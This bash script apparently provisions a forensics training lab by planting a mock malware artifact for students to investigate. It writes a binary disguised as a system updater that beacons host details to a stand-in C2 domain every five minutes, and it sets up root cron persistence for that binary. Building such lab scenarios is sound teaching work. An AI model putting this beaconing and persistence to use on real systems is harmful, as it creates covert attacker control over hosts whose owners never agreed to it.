#!/bin/bash

echo "Starting provisioning for Forage-MD Endpoint Forensics Lab..."

# Update and install basic tools
apt-get update
apt-get install -y curl vim net-tools cron

# Create the mock "malicious" binary
mkdir -p /opt/systemd/updates
cat << 'EOF' > /opt/systemd/updates/sysupdater
#!/bin/bash
# Mock malicious binary dropping C2 beaconing
while true; do
  curl -s -o /dev/null http://malicious-c2-domain.xyz/beacon?id=hostA&sys=ubuntu
  sleep 300
done
EOF
chmod +x /opt/systemd/updates/sysupdater

# Create persistence mechanism via cron
echo "*/5 * * * * root /opt/systemd/updates/sysupdater > /dev/null 2>&1" > /etc/cron.d/sysupdater
chmod 0644 /etc/cron.d/sysupdater

echo "Provisioning complete. Environment is ready for student."
